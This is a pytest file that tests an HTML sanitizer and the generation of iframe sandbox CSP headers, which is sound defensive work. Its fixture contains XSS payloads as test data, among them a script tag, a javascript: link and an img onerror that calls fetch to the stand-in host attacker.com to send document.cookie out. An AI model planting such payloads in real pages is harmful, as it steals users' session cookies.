import pytest
from app.security.sanitizer import sanitize_html_content, generate_sandbox_headers

def test_xss_vector_neutralization():
    malicious_html = """
    <div>
    <h1>Safe Content Header</h1>
    <script>alert('XSS Attack Execution')</script>
    <img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)" />
    <a href="javascript:alert(1)">Click Here</a>
    </div>
    """
    clean_html = sanitize_html_content(malicious_html)
    assert "<script>" not in clean_html
    assert "onerror" not in clean_html
    assert "javascript:" not in clean_html
    assert "<h1>Safe Content Header</h1>" in clean_html

def test_iframe_sandbox_header_generation():
    headers = generate_sandbox_headers()
    assert "Content-Security-Policy" in headers
    csp = headers["Content-Security-Policy"]
    assert "sandbox allow-scripts" in csp
    # allow-same-origin must BE EXCLUDED to prevent iframe stealing parent cookies
    assert "allow-same-origin" not in csp
